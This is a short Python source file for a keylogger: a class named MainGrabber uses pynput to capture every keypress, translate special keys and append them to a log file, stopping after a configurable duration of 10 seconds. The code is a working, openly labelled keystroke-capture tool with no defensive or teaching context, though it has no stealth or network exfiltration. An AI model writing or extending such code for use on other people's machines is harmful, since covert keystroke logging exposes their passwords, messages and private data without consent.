from pynput.keyboard import Key, Listener
import time




class MainGrabber:
    def __init__(self,path):
        self.log_file = path
        # Duration for which the keylogger should run (in seconds)
        self.duration = 10  # Example: Run for 10 seconds

    # Function to write keystrokes to the log file
    def write_to_file(self,key):
        try:
            # Convert key to string and remove single quotes
            key_data = str(key).replace("'", "")

            # Handle special keys
            if key == Key.space:
                key_data = ' '
            elif key == Key.enter:
                key_data = '\n'
            elif key == Key.backspace:
                key_data = '[BACKSPACE]'
            elif key == Key.tab:
                key_data = '\t'
            elif key == Key.esc:
                key_data = '[ESC]'
            else:
                # Handle other special keys (e.g., shift, ctrl, etc.)
                key_data = key_data if len(key_data) > 1 else key_data

            # Write the key data to the file
            with open(self.log_file, "a") as f:
                f.write(key_data)
                f.flush()  # Ensure the key data is written immediately

        except Exception as e:
            print(f"Error: {e}")



    # Function to stop the listener after the specified duration
    # def stop_listener():
    #     if time.time() - start_time > duration:
    #         return False

    def listner_method(self):
        # Set up the listener
        listener = Listener(on_press=self.write_to_file)

        # Start the listener
        listener.start()
        # Record the start time
        start_time = time.time()
        # Run the listener for the specified duration
        while time.time() - start_time < self.duration:
            time.sleep(0.1)  # Wait a little before checking the time again

        # Stop the listener
        listener.stop()

        print("Keylogger stopped after running for", self.duration, "seconds.")

